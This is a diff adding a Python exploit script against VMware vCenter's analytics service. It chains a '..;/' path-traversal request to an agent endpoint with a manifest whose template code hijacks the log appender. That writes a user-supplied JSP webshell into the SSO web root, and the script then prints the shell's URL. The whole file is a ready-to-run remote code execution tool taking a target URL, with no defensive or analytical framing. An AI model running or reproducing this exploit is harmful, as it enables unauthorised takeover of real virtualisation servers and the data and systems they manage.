@@ -1,0 +1,151 @@
+import random
+import string
+import requests
+import argparse
+import warnings
+
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+
+
+def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+
+def str_to_escaped_unicode(arg_str):
+    escaped_str = ''
+    for s in arg_str:
+        val = ord(s)
+        esc_uni = "\\u{:04x}".format(val)
+        escaped_str += esc_uni
+    return escaped_str
+
+
+def post_data(url, data, proxies):
+    headers = {"Cache-Control": "max-age=0",
+               "Upgrade-Insecure-Requests": "1",
+               "User-Agent": "Mozilla/5.0",
+               "X-Deployment-Secret": "abc",
+               "Content-Type": "application/json",
+               "Connection": "close"}
+    requests.post(url, headers=headers, json=data, verify=False, proxies=proxies)
+
+
+def upload_manifest(target, proxies, agent_name, log_param):
+    print("[*] uploading manifest")
+    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c=%s&_i=%s" % (
+        target, agent_name, log_param)
+    data = {"contextData": "a3", "manifestContent": manifest_data, "objectId": "a2"}
+    post_data(url, data, proxies)
+
+
+def create_agent(target, proxies, agent_name, log_param):
+    print("[*] creating agent")
+    url = "%s/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c=%s&_i=%s" % (
+    target, agent_name, log_param)
+    data = {"manifestSpec": {},
+            "objectType": "a2",
+            "collectionTriggerDataNeeded": True,
+            "deploymentDataNeeded": True,
+            "resultNeeded": True,
+            "signalCollectionCompleted": True,
+            "localManifestPath": "a7",
+            "localPayloadPath": "a8",
+            "localObfuscationMapPath": "a9"}
+    post_data(url, data, proxies)
+
+
+def generate_manifest(name, content):
+    content = str_to_escaped_unicode(content)
+    path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % name
+    data = """<manifest recommendedPageSize="500">
+       <request>
+          <query name="vir:VCenter">
+             <constraint>
+                <targetType>ServiceInstance</targetType>
+             </constraint>
+             <propertySpec>
+                <propertyNames>content.about.instanceUuid</propertyNames>
+                <propertyNames>content.about.osType</propertyNames>
+                <propertyNames>content.about.build</propertyNames>
+                <propertyNames>content.about.version</propertyNames>
+             </propertySpec>
+          </query>
+       </request>
+       <cdfMapping>
+          <indepedentResultsMapping>
+             <resultSetMappings>
+                <entry>
+                   <key>vir:VCenter</key>
+                   <value>
+                      <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
+                         <resourceItemToJsonLdMapping>
+                            <forType>ServiceInstance</forType>
+                         <mappingCode><![CDATA[    
+                            #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
+                            #set($orig_log = $appender.getFile())##
+                            #set($logger = $GLOBAL-logger.logger.parent)##     
+                            $appender.setFile("%s")##     
+                            $appender.activateOptions()##  
+                            $logger.warn("%s")##   
+                            $appender.setFile($orig_log)##     
+                            $appender.activateOptions()##]]>
+                         </mappingCode>
+                         </resourceItemToJsonLdMapping>
+                      </value>
+                   </value>
+                </entry>
+             </resultSetMappings>
+          </indepedentResultsMapping>
+       </cdfMapping>
+       <requestSchedules>
+          <schedule interval="1h">
+             <queries>
+                <query>vir:VCenter</query>
+             </queries>
+          </schedule>
+       </requestSchedules>
+    </manifest>""" % (path, content)
+    return data
+
+
+def get_webshell(path):
+    with open(path) as file:
+        content = file.read()
+    return content
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest='target', help="target url(e.g. https://192.168.1.1)", required=True)
+    parser.add_argument('-s', '--shell', dest='shell', help="local webshell file path(default cmd.jsp)")
+    parser.add_argument('-p', '--proxy', dest='proxy', help="request proxy(e.g. http://127.0.0.1:1080)")
+    args = parser.parse_args()
+
+    target = args.target
+    if target[-1] == "/":
+        target = target[0:-1]
+    print("[*] target: %s" % target)
+
+    path = args.shell
+    if path is None:
+        path = "cmd.jsp"
+    print("[*] webshell: %s" % path)
+
+    proxy = args.proxy
+    proxies = None
+    if proxy:
+        proxies = {"http": proxy, "https": proxy}
+        print("[*] proxy: %s" % proxy)
+
+    log_param = id_generator(6)
+    agent_name = id_generator(6)
+    shell_name = id_generator(6) + ".jsp"
+
+    webshell_content = get_webshell(path)
+    manifest_data = generate_manifest(shell_name, webshell_content)
+
+    create_agent(target, proxies, agent_name, log_param)
+    upload_manifest(target, proxies, agent_name, log_param)
+
+    url = "%s/idm/..;/%s" % (target, shell_name)
+    print("[!] webshell url: %s" % url)
